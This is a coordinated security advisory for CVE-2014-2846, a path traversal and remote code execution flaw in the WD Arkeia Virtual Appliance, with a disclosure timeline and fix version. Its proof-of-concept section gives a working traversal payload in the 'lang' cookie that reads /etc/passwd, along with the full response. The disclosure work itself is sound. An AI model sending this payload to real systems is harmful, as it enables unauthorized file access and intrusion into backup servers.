@@ -1,0 +1,171 @@
+SEC Consult Vulnerability Lab Security Advisory < 20140423-0 >
+=======================================================================
+              title: Path Traversal/Remote Code Execution
+            product: WD Arkeia Virtual Appliance (AVA)
+ vulnerable version: All Arkeia Network Backup releases (ASA/APA/AVA) since 7.0.3.
+      fixed version: 10.2.9
+         CVE number: CVE-2014-2846
+             impact: critical
+           homepage: http://www.arkeia.com/
+              found: 2014-03-05
+                 by: M. Lucinskij
+                     SEC Consult Vulnerability Lab
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+"The WD Arkeia virtual appliance (AVA) for backup provides simple, reliable and
+affordable data protection for enterprises seeking to optimize the benefits of
+virtualization. The AVA offers all the features of the hardware appliance, but
+permits you to use your own choice of hardware."
+
+source:
+http://www.arkeia.com/en/products/arkeia-network-backup/backup-server/virtual-appliance
+
+
+Business recommendation:
+------------------------
+The identified path traversal vulnerability can be exploited by unauthenticated
+remote attackers to gain unauthorized access to the WD Arkeia virtual appliance
+and stored backup data.
+
+SEC Consult recommends to restrict access to the web interface of the WD Arkeia
+virtual appliance using a firewall until a comprehensive security
+audit based on a security source code review has been performed and all
+identified security deficiencies have been resolved by the affected vendor.
+
+
+Vulnerability overview/description:
+-----------------------------------
+The WD Arkeia virtual appliance is affected by a path traversal vulnerability.
+Path traversal enables attackers access to files and directories outside the
+web root through relative file paths in the user input.
+
+An unauthenticated remote attacker can exploit the identified vulnerability in
+order to retrieve arbitrary files from the affected system and execute system
+commands.
+
+
+Proof of concept:
+-----------------
+The path traversal vulnerability exists in the
+/opt/arkeia/wui/htdocs/index.php script. The value of the "lang" cookie
+is not properly checked before including a file using the PHP include()
+function. Example of the request that demonstrates the vulnerability by
+retrieving the contents of the /etc/passwd file:
+
+POST /login/doLogin HTTP/1.0
+Host: $host
+Cookie: lang=aaa..././..././..././..././..././..././etc/passwd%00
+Content-Length: 25
+Content-Type: application/x-www-form-urlencoded
+
+password=bbb&username=aaa
+
+The response from the affected application:
+
+HTTP/1.1 200 OK
+Date: Wed, 05 Mar 2014 08:29:35 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.3
+Set-Cookie: PHPSESSID=2ga2peps9eak48ubnkvhf69n40; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Set-Cookie: subaction=deleted; expires=Tue, 05-Mar-2013 08:29:34 GMT; path=/
+Cache-Control: no-cache
+Pragma: no-cache
+Charset: UTF-8
+Content-Length: 1217
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+saslauth:x:499:76:"Saslauthd user":/var/empty/saslauth:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+apache:x:48:48:Apache:/var/www:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+ldap:x:55:55:LDAP User:/var/lib/ldap:/sbin/nologin
+dhcpd:x:177:177:DHCP server:/:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+{"local":{"STATUS":["0"],"MESSAGE":["Error code 4, Bad password or
+login"],"PARAM2":[""],"PARAM3":[null],"LAST":[1],"sessnum":[null],"transnum":[n
+ull]}}
+
+Furthermore, the identified vulnerability can be also exploited to
+execute arbitrary PHP code/system commands by including files that
+contain specially crafted user input.
+
+
+Vulnerable / tested versions:
+-----------------------------
+The vulnerability has been verified to exist in the 10.2.7 version of the WD
+Arkeia virtual appliance.
+
+According to the vendor all Arkeia Network Backup releases (ASA/APA/AVA) since
+7.0.3 are affected.
+
+
+Vendor contact timeline:
+------------------------
+2014-03-13: Contacting vendor through support@arkeia.com
+2014-03-14: Vendor confirms the vulnerability.
+2014-03-17: Vendor provides a quick fix and a release schedule.
+2014-04-21: Vendor releases a fixed version
+2014-04-23: SEC Consult releases a coordinated security advisory.
+
+
+Solution:
+---------
+Update to the most recent version (10.2.9) of Arkeia Network Backup.
+
+More information can be found at:
+http://wiki.arkeia.com/index.php/Path_Traversal_Remote_Code_Execution
+
+
+Workaround:
+-----------
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Vienna - Bangkok - Frankfurt/Main - Montreal - Singapore - Vilnius
+
+Headquarter:
+Mooslackengasse 17, 1190 Vienna, Austria
+Phone:   +43 1 8903043 0
+Fax:     +43 1 8903043 15
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+Interested to work with the experts of SEC Consult?
+Write to career@sec-consult.com
+
+EOF M. Lucinskij / @2014
